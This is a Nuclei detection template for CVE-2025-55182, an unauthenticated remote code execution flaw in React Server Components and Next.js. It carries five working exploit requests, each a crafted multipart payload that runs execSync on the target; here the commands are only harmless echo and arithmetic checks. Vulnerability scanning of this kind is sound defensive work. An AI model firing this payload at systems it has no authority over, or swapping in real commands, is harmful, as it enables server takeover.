id: CVE-2025-55182

info:
  name: React Server Components - Unsafe Deserialization RCE (React2Shell)
  author: CyberTechAjju
  severity: critical
  description: |
    React Server Components 19.0.0, 19.1.0, 19.1.1, and 19.2.0 including react-server-dom-parcel,
    react-server-dom-turbopack, and react-server-dom-webpack contain a remote code execution caused
    by unsafe deserialization of payloads from HTTP requests to Server Function endpoints, letting
    unauthenticated attackers execute arbitrary code remotely. The exploit requires no authentication.
    Next.js versions 15.x and 16.x using App Router are also vulnerable.
  impact: |
    Unauthenticated attackers can execute arbitrary code remotely, potentially leading to full system compromise,
    including cloud credential harvesting, cryptocurrency mining, and complete server takeover.
  remediation: |
    Immediately upgrade to patched versions: Next.js 15.0.5+, 15.1.9+, 15.2.6+, 15.3.6+, 15.4.8+, 15.5.7+, 16.0.7+
    or React 19.0.1+, 19.1.2+, 19.2.1+
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2025-55182
    - https://github.com/assetnote/react2shell-scanner
    - https://gist.github.com/maple3142/48bc9393f45e068cf8c90ab865c0f5f3
    - https://react.dev/blog/2025/12/03/critical-security-vulnerability-in-react-server-components
    - https://github.com/vercel/next.js/security/advisories/GHSA-9qr9-h5gf-34mp
    - https://vercel.com/changelog/cve-2025-55182
    - https://www.rapid7.com/blog/post/2025/12/04/etr-critical-rce-in-react-server-components-cve-2025-55182/
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 10
    cve-id: CVE-2025-55182
    cwe-id: CWE-502
    epss-score: 0.97
    epss-percentile: 0.99
    cpe: cpe:2.3:a:facebook:react:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 5
    vendor: facebook
    product: react
    framework: next.js
    shodan-query:
      - http.component:"next.js"
      - http.title:"next.js"
      - cpe:"cpe:2.3:a:facebook:react"
  tags: cve,cve2025,react,nextjs,rsc,rce,deserialization,react2shell,kev,critical,intrusive
variables:
  request-id: "{{to_lower(rand_text_alphanumeric(8))}}"
  nextjs-html: "{{rand_text_alphanumeric(21)}}"
  num1: "{{rand_int(40000, 44800)}}"
  num2: "{{rand_int(40000, 44800)}}"
  result: "{{to_number(num1)*to_number(num2)}}"
  marker: "{{rand_text_alphanumeric(12)}}"

http:
  - raw:
      # Request 1: Linux/Unix RCE with mathematical validation (most reliable)
      - |
        @timeout 15s
        POST / HTTP/1.1
        Host: {{Hostname}}
        Next-Action: x
        X-Nextjs-Request-Id: {{request-id}}
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad
        X-Nextjs-Html-Request-Id: {{nextjs-html}}

        ------WebKitFormBoundaryx8jO2oVc6SWP3Sad
        Content-Disposition: form-data; name="0"

        {"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"var res=process.mainModule.require('child_process').execSync('echo $(({{num1}}*{{num2}}))').toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),{digest: `NEXT_REDIRECT;push;/login?a=${res};307;`});","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}
        ------WebKitFormBoundaryx8jO2oVc6SWP3Sad
        Content-Disposition: form-data; name="1"

        "$@0"
        ------WebKitFormBoundaryx8jO2oVc6SWP3Sad
        Content-Disposition: form-data; name="2"

        []
        ------WebKitFormBoundaryx8jO2oVc6SWP3Sad--

      # Request 2: Windows RCE with mathematical validation
      - |
        @timeout 15s
        POST / HTTP/1.1
        Host: {{Hostname}}
        Next-Action: x
        X-Nextjs-Request-Id: {{request-id}}
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad
        X-Nextjs-Html-Request-Id: {{nextjs-html}}

        ------WebKitFormBoundaryx8jO2oVc6SWP3Sad
        Content-Disposition: form-data; name="0"

        {"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"var res=process.mainModule.require('child_process').execSync('powershell -c \"{{num1}}*{{num2}}\"').toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),{digest: `NEXT_REDIRECT;push;/login?a=${res};307;`});","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}
        ------WebKitFormBoundaryx8jO2oVc6SWP3Sad
        Content-Disposition: form-data; name="1"

        "$@0"
        ------WebKitFormBoundaryx8jO2oVc6SWP3Sad
        Content-Disposition: form-data; name="2"

        []
        ------WebKitFormBoundaryx8jO2oVc6SWP3Sad--

      # Request 3: Alternative endpoint /_next/data with math validation
      - |
        @timeout 15s
        POST /_next/data HTTP/1.1
        Host: {{Hostname}}
        Next-Action: x
        X-Nextjs-Request-Id: {{request-id}}
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad
        X-Nextjs-Html-Request-Id: {{nextjs-html}}

        ------WebKitFormBoundaryx8jO2oVc6SWP3Sad
        Content-Disposition: form-data; name="0"

        {"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"var res=process.mainModule.require('child_process').execSync('echo $(({{num1}}*{{num2}}))').toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),{digest: `NEXT_REDIRECT;push;/login?a=${res};307;`});","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}
        ------WebKitFormBoundaryx8jO2oVc6SWP3Sad
        Content-Disposition: form-data; name="1"

        "$@0"
        ------WebKitFormBoundaryx8jO2oVc6SWP3Sad
        Content-Disposition: form-data; name="2"

        []
        ------WebKitFormBoundaryx8jO2oVc6SWP3Sad--

      # Request 4: Simple marker-based validation for broader compatibility
      - |
        @timeout 15s
        POST / HTTP/1.1
        Host: {{Hostname}}
        Next-Action: x
        X-Nextjs-Request-Id: {{request-id}}
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad
        X-Nextjs-Html-Request-Id: {{nextjs-html}}

        ------WebKitFormBoundaryx8jO2oVc6SWP3Sad
        Content-Disposition: form-data; name="0"

        {"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"var res=process.mainModule.require('child_process').execSync('echo {{marker}}').toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),{digest: `NEXT_REDIRECT;push;/login?a=${res};307;`});","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}
        ------WebKitFormBoundaryx8jO2oVc6SWP3Sad
        Content-Disposition: form-data; name="1"

        "$@0"
        ------WebKitFormBoundaryx8jO2oVc6SWP3Sad
        Content-Disposition: form-data; name="2"

        []
        ------WebKitFormBoundaryx8jO2oVc6SWP3Sad--

      # Request 5: Deep path testing with marker
      - |
        @timeout 15s
        POST /api/auth HTTP/1.1
        Host: {{Hostname}}
        Next-Action: x
        X-Nextjs-Request-Id: {{request-id}}
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad
        X-Nextjs-Html-Request-Id: {{nextjs-html}}

        ------WebKitFormBoundaryx8jO2oVc6SWP3Sad
        Content-Disposition: form-data; name="0"

        {"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"var res=process.mainModule.require('child_process').execSync('echo {{marker}}').toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),{digest: `NEXT_REDIRECT;push;/login?a=${res};307;`});","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}
        ------WebKitFormBoundaryx8jO2oVc6SWP3Sad
        Content-Disposition: form-data; name="1"

        "$@0"
        ------WebKitFormBoundaryx8jO2oVc6SWP3Sad
        Content-Disposition: form-data; name="2"

        []
        ------WebKitFormBoundaryx8jO2oVc6SWP3Sad--

    stop-at-first-match: false
    cookie-reuse: true
    max-redirects: 3

    matchers-condition: or
    matchers:
      # Primary matcher: Mathematical validation (ZERO false positives)
      - type: dsl
        name: math-validation
        dsl:
          - "contains(to_lower(header), 'x-action-redirect: /login?a={{result}}')"
          - "contains(to_lower(all_headers), '/login?a={{result}}')"
        condition: or

      # Secondary matcher: Marker-based validation
      - type: dsl
        name: marker-validation
        dsl:
          - "contains(to_lower(header), 'x-action-redirect') && contains(to_lower(header), '{{marker}}')"
          - "contains(to_lower(all_headers), '/login?a={{marker}}')"
        condition: or

      # Tertiary matcher: Response body contains calculated result
      - type: dsl
        name: body-math-check
        dsl:
          - "contains(body, '{{result}}')"
          - "contains(body, '{{marker}}')"
        condition: or

    extractors:
      - type: regex
        part: header
        group: 1
        regex:
          - 'x-action-redirect: ([^\r\n]+)'
          - 'location: ([^\r\n]+)'
        name: redirect_proof

      - type: regex
        part: body
        regex:
          - '(?i)({{result}})'
          - '(?i)({{marker}})'
        name: execution_proof

      - type: kval
        part: header
        kval:
          - x_nextjs_version
          - x_vercel_id
          - server
        name: server_info
# digest: 4a0a00473045022100fb3c77d03dfdd605a529ff610f015ef0c65a8b88f30aecc23337ea264a19f5a102206f0a1118dde8de5820e48c3216812461f23a3ecdfeacc9f532cb5d6845cbd35c:922c64590222798bb761d5b6d8e72950
